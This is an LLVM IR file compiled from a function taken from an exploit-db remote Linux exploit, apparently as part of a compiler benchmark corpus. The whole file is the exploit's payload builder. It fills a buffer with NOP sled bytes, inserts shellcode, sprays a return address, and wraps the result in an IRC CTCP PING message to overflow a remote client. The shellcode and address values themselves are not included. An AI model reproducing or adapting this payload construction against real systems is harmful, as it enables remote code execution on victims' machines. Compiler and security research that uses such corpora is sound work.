; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23366.c_build.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23366.c_build.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [57 x i8] c"[%s] Building evil string to send (using ret '0x%x')...\0A\00", align 1
@ret_addr = common dso_local global i32 0, align 4
@BUFFERSIZE = common dso_local global i32 0, align 4
@SIZE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [38 x i8] c"[-] Can't allocate memory,exiting...\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [31 x i8] c":%s!x PRIVMSG a: %cPING %s%c\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @build(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i64*, align 8
  store i8* %0, i8** %2, align 8
  %9 = load i32, i32* @stdout, align 4
  %10 = load i8*, i8** %2, align 8
  %11 = load i32, i32* @ret_addr, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %9, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0), i8* %10, i32 %11)
  %13 = load i32, i32* @BUFFERSIZE, align 4
  %14 = add nsw i32 %13, 1
  %15 = call i64 @malloc(i32 %14)
  %16 = inttoptr i64 %15 to i8*
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* @SIZE, align 4
  %18 = add nsw i32 %17, 1
  %19 = call i64 @malloc(i32 %18)
  %20 = inttoptr i64 %19 to i8*
  store i8* %20, i8** %5, align 8
  %21 = call i64 @malloc(i32 256)
  %22 = inttoptr i64 %21 to i8*
  store i8* %22, i8** %6, align 8
  %23 = load i8*, i8** %3, align 8
  %24 = icmp ne i8* %23, null
  br i1 %24, label %25, label %31

25:                                               ; preds = %1
  %26 = load i8*, i8** %5, align 8
  %27 = icmp ne i8* %26, null
  br i1 %27, label %28, label %31

28:                                               ; preds = %25
  %29 = load i8*, i8** %6, align 8
  %30 = icmp ne i8* %29, null
  br i1 %30, label %35, label %31

31:                                               ; preds = %28, %25, %1
  %32 = load i32, i32* @stderr, align 4
  %33 = call i32 (i32, i8*, ...) @fprintf(i32 %32, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.1, i64 0, i64 0))
  %34 = call i32 @exit(i32 0) #3
  unreachable

35:                                               ; preds = %28
  %36 = load i8*, i8** %3, align 8
  store i8* %36, i8** %4, align 8
  %37 = load i8*, i8** %4, align 8
  %38 = load i32, i32* @BUFFERSIZE, align 4
  %39 = call i32 @memset(i8* %37, i32 144, i32 %38)
  %40 = load i32*, i32** @shellcode, align 8
  %41 = call i32 @strlen(i32* %40)
  %42 = sub nsw i32 500, %41
  %43 = load i8*, i8** %4, align 8
  %44 = sext i32 %42 to i64
  %45 = getelementptr inbounds i8, i8* %43, i64 %44
  store i8* %45, i8** %4, align 8
  store i32 0, i32* %7, align 4
  br label %46

46:                                               ; preds = %60, %35
  %47 = load i32, i32* %7, align 4
  %48 = load i32*, i32** @shellcode, align 8
  %49 = call i32 @strlen(i32* %48)
  %50 = icmp slt i32 %47, %49
  br i1 %50, label %51, label %63

51:                                               ; preds = %46
  %52 = load i32*, i32** @shellcode, align 8
  %53 = load i32, i32* %7, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i32, i32* %52, i64 %54
  %56 = load i32, i32* %55, align 4
  %57 = trunc i32 %56 to i8
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %4, align 8
  store i8 %57, i8* %58, align 1
  br label %60

60:                                               ; preds = %51
  %61 = load i32, i32* %7, align 4
  %62 = add nsw i32 %61, 1
  store i32 %62, i32* %7, align 4
  br label %46

63:                                               ; preds = %46
  %64 = load i8*, i8** %4, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 102
  store i8* %65, i8** %4, align 8
  %66 = load i8*, i8** %4, align 8
  store i8 0, i8* %66, align 1
  %67 = load i8*, i8** %6, align 8
  store i8* %67, i8** %4, align 8
  %68 = load i8*, i8** %4, align 8
  %69 = bitcast i8* %68 to i64*
  store i64* %69, i64** %8, align 8
  store i32 0, i32* %7, align 4
  br label %70

70:                                               ; preds = %78, %63
  %71 = load i32, i32* %7, align 4
  %72 = icmp slt i32 %71, 151
  br i1 %72, label %73, label %81

73:                                               ; preds = %70
  %74 = load i32, i32* @ret_addr, align 4
  %75 = sext i32 %74 to i64
  %76 = load i64*, i64** %8, align 8
  %77 = getelementptr inbounds i64, i64* %76, i32 1
  store i64* %77, i64** %8, align 8
  store i64 %75, i64* %76, align 8
  br label %78

78:                                               ; preds = %73
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 4
  store i32 %80, i32* %7, align 4
  br label %70

81:                                               ; preds = %70
  %82 = load i64*, i64** %8, align 8
  %83 = bitcast i64* %82 to i8*
  store i8* %83, i8** %4, align 8
  %84 = load i8*, i8** %4, align 8
  store i8 0, i8* %84, align 1
  %85 = load i8*, i8** %5, align 8
  %86 = load i32, i32* @SIZE, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = load i8*, i8** %6, align 8
  %89 = call i32 @snprintf(i8* %85, i32 %86, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0), i8* %87, i32 1, i8* %88, i32 1)
  %90 = load i8*, i8** %5, align 8
  ret i8* %90
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
